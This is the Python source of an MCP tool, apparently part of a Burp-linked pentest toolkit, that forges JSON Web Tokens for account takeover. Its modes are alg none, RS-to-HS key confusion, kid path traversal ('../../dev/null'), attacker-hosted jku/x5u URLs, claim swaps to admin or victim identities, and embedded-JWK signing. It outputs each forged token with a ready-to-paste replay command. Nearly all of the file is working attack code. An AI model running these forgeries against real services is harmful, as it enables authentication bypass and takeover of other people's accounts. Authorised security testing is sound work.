"""forge_jwt — native JWT forger covering the eight common attack classes.

Operates locally (no Burp round-trip). Returns the forged token plus a
ready-to-paste curl line so the operator can replay against the target.

Attack modes:
- alg_none           Strip signature, set header alg='none'
- hs_confusion       RS256/384/512 → HS256 confusion (sign with public key as
                     HMAC secret). Operator supplies the public key PEM.
- kid_inject         kid: <traversal>  + sign with attacker-known content
- jku                jku header → attacker JWKS URL (operator supplies)
- claim_swap         Modify arbitrary claims (sub, role, admin, exp, ...) and
                     re-sign with operator-supplied HS secret OR forge unsigned
                     (alg:none) via use_alg_none=True
- jwk_embed          Generate fresh RSA keypair, embed public JWK in header,
                     sign with matching private key. Bypasses trust chain when
                     server uses embedded jwk for verification.
- jwt_x5u            x5u header pointing at attacker URL (operator-supplied)

The operator owns the forged-token risk — these tools do not send. Replay
the curl line through Burp via curl_request / send_raw_request to get a
logger_index for evidence.
"""

from __future__ import annotations

import json
from typing import Any

from mcp.server.fastmcp import FastMCP

from ._jwt_codec import (
    decode_header,
    decode_payload,
    encode_segment,
    generate_rsa_keypair_for_embed,
    sign_hmac,
    sign_rsa,
    split_jwt,
)


from ._forge_jwt_modes import (
    _VALID_MODES, _forge_alg_none, _forge_hs_confusion, _forge_kid_inject,
    _forge_url_header, _forge_claim_swap, _forge_jwk_embed,
)

def register(mcp: FastMCP):

    @mcp.tool()
    async def forge_jwt(
        token: str,
        mode: str,
        claim_changes: dict | None = None,
        public_key_pem: str = "",
        hmac_secret: str = "",
        kid_value: str = "",
        attacker_url: str = "",
        use_alg_none: bool = False,
        target_url: str = "",
    ) -> str:
        """Forge a JWT for ATO confirmation. Local compute, no HTTP.

        Args:
            token: Original JWT to mutate (header.payload.signature)
            mode: alg_none / hs_confusion / kid_inject / jku / x5u / claim_swap / jwk_embed
            claim_changes: Payload claims to add or replace (e.g. {"role": "admin", "sub": "victim"})
            public_key_pem: PEM-encoded RSA public key (hs_confusion mode only)
            hmac_secret: HMAC secret string for kid_inject / claim_swap (raw, not b64)
            kid_value: kid header value for kid_inject (e.g. "../../dev/null")
            attacker_url: URL for jku / x5u modes (attacker-hosted JWKS / cert chain)
            use_alg_none: claim_swap variant — strip signature instead of re-signing
            target_url: Optional — if set, output includes a curl replay command
        """
        try:
            split_jwt(token)
        except ValueError as e:
            return f"Error: {e}"

        if mode not in _VALID_MODES:
            return f"Error: invalid mode {mode!r}. Valid: {', '.join(_VALID_MODES)}"

        changes = claim_changes or {}
        priv_pem_out = ""

        try:
            match mode:
                case "alg_none":
                    forged, note = _forge_alg_none(token, changes)
                case "hs_confusion":
                    forged, note = _forge_hs_confusion(token, public_key_pem, changes)
                case "kid_inject":
                    if not kid_value:
                        return "Error: kid_inject requires kid_value (e.g. '../../dev/null')"
                    secret = hmac_secret.encode() if hmac_secret else b""
                    forged, note = _forge_kid_inject(token, kid_value, secret, changes)
                case "jku":
                    forged, note = _forge_url_header(token, "jku", attacker_url, changes)
                case "x5u":
                    forged, note = _forge_url_header(token, "x5u", attacker_url, changes)
                case "claim_swap":
                    secret = hmac_secret.encode() if hmac_secret else None
                    forged, note = _forge_claim_swap(token, changes, secret, use_alg_none)
                case "jwk_embed":
                    forged, note, priv_pem_out = _forge_jwk_embed(token, changes)
                case _:
                    return f"Error: unhandled mode {mode!r}"
        except ValueError as e:
            return f"Error: {e}"
        except Exception as e:
            return f"Error during forge: {type(e).__name__}: {e}"

        # Output composition — keep tight; the operator pastes the curl line
        # into curl_request or send_raw_request to get a logger_index.
        lines = [
            f"Forged JWT ({mode}): {note}",
            "",
            "Original payload claims:",
            f"  {json.dumps(decode_payload(token), indent=2)}",
            "",
            "Modified claims:",
            f"  {json.dumps(changes, indent=2) if changes else '  (none)'}",
            "",
            "Forged token:",
            f"  {forged}",
        ]

        if priv_pem_out:
            lines.extend([
                "",
                "Private key (host this as a JWKS at attacker URL for jku):",
                priv_pem_out.strip(),
            ])

        if target_url:
            lines.extend([
                "",
                "Replay via Burp:",
                f"  curl_request(method='GET', url='{target_url}', "
                f"headers={{'Authorization': 'Bearer {forged}'}})",
            ])
        else:
            lines.extend([
                "",
                "Replay via Burp:",
                f"  curl_request(method='GET', url='<protected_endpoint>', "
                f"headers={{'Authorization': 'Bearer {forged}'}})",
            ])

        return "\n".join(lines)
